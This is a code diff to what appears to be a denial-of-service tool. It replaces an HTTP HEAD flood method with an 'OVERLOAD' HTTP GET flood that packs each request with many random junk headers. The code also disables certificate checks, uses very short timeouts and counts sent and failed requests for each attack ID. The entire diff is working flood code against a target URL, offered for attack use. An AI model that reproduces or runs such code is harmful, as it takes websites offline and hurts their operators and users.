@@ -22,7 +22,7 @@ SOFTWARE.
 
 '''
 
-import time, requests
+import time, requests, urllib3
 from src.core import Core
 from src.utils import *
 from src.useragent import *
@@ -34,29 +34,38 @@ def flood(attack_id, url, stoptime) -> None:
             continue
         
         try:
-            Core.session.head(
+
+            headers = {'User-Agent': urllib3.util.SKIP_HEADER}
+            for _ in range(randint(8,16)): # append some random data to the dictionary
+                key = utils().randstr(randint(50,100))
+                value = utils().randstr(randint(200, 400))
+
+                headers[key] = value
+
+            Core.session.get(
                 utils().buildblock(url), 
-                headers=utils().buildheaders(url),
+                headers=headers,
                 verify=False, 
                 timeout=(5,0.1), 
                 allow_redirects=False,
                 stream=False,
-                cert=None,
+                cert=None
             )
 
             Core.infodict[attack_id]['req_sent'] += 1
         except requests.exceptions.ReadTimeout:
             Core.infodict[attack_id]['req_sent'] += 1
 
-        except Exception:
+        except Exception as e:
+            print(e)
             Core.infodict[attack_id]['req_fail'] += 1
 
         Core.infodict[attack_id]['req_total'] += 1
     Core.threadcount -= 1
 
 Core.methods.update({
-    'HEAD': {
-        'info': 'HTTP HEAD flood',
+    'OVERLOAD': {
+        'info': 'HTTP GET flood that fills the headers dictionary with lots of junk data',
         'func': flood
     }
 })
